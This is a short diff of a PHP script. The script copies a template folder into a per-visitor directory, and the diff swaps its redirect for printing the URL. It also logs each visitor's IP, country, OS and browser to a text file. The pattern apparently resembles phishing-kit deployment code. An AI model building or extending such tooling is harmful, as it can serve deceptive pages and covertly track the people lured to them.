@@ -24,8 +24,9 @@ closedir($dir);
 }
 $home="ro";
 recurse_copy( $home,$DIR );
-$url = 'https://'.$_SERVER['HTTP_HOST'].$DIR;
-header("location:$url");
+$url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$DIR;
+// header("location:$url");
+echo $url;
 $file = fopen("vu.txt","a");
 fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");
 
